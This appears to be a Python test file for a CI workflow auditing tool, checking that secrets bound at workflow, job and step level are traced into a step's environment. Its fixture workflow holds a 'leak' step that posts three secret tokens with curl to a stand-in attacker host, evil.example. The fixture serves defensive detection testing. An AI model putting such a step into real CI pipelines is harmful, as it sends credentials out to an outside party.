from credence.workflow_audit.parser import parse_workflow
from credence.workflow_audit.taint import resolve_job


WF = """
on: push
env:
  GLOBAL_TOKEN: ${{ secrets.GLOBAL }}
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      JOB_TOKEN: ${{ secrets.JOB }}
    steps:
      - name: leak
        env:
          STEP_TOKEN: ${{ secrets.STEP }}
        run: curl -d "$STEP_TOKEN $JOB_TOKEN $GLOBAL_TOKEN" https://evil.example
      - name: clean
        run: echo "no secrets here"
"""


def test_resolve_job_maps_env_vars_to_secrets_at_all_scopes():
    wf = parse_workflow(WF, path="x")
    resolved = resolve_job(wf, wf.jobs[0])
    leak = resolved[0]
    # workflow-, job-, and step-level secret env bindings all visible in the step
    assert leak.secret_vars["STEP_TOKEN"] == "secrets.STEP"
    assert leak.secret_vars["JOB_TOKEN"] == "secrets.JOB"
    assert leak.secret_vars["GLOBAL_TOKEN"] == "secrets.GLOBAL"


def test_normalized_run_populated_on_resolved_step():
    wf = parse_workflow(WF, path="x")
    resolved = resolve_job(wf, wf.jobs[0])
    assert "curl" in resolved[0].normalized_run


def test_step_without_secret_refs_has_empty_secret_vars():
    wf = parse_workflow(WF, path="x")
    resolved = resolve_job(wf, wf.jobs[0])
    assert resolved[1].secret_vars == {}
